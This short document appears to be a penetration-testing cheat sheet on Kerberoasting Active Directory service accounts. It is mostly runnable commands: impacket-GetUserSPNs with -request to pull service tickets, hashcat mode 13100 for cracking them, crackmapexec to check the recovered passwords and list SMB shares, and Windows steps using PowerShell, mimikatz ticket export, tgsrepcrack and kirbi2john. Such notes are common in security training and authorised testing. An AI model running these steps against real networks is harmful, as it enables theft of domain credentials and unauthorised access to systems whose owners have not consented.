
### Linux

impacket-GetUserSPNs machine.local/uid:Password -dc-ip 10.10.0.0 -request


NOTE: The command above will find any kerberoastable accounts. The -request flag will go ahead and roast them and return the ticket.

Once a ticket is returned we can copy that.

If you copy out the 1st part of the ticket, `$krb5tgs$23$`  you can search for a proper hashcat 13100 is Kerberos 5 for example.

Once we get a password with hashcat we can test it:

`crackmapexec smb 10.10.0.23 -u 'enterprise-core-vn' -p 'ryanerjv44,s6j,'`
SMB   10.10.0.23       445     WIN-2B08M10E1M1  [+] machine.local\enterprise-core-vn:password

You should see something like the above if it was successful. If it was then you can just run other command like adding --shares would list the SMB Shares.

`crackmapexec smb 10.10.0.23 -u 'enterprise-core-vn' -p 'ryanerjv44,s6j,' --shares`

### Windows

Nidem-Kerberoast - https://github.com/nidem/kerberoast.git
		* PowerShell scripts
```powershell

	Usage:
		1. Get Users with SPNs
			GetUserSPNs.ps1
		2. Get Service Tickets
			Add-Type -AssemblyName System.IdentityModel
			New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -
			ArguementList "MSSQLSvc/xor-app23.xor.com:1433"
		3. Extract Tickets
			mimikatz # kerberos::list /export
		4. Crack tickets
			./tgsrepcrack.py wordlist.txt <ticket.kirbi>
			or
			kirbi2john <ticket.kirbi> then use hashcat w/ result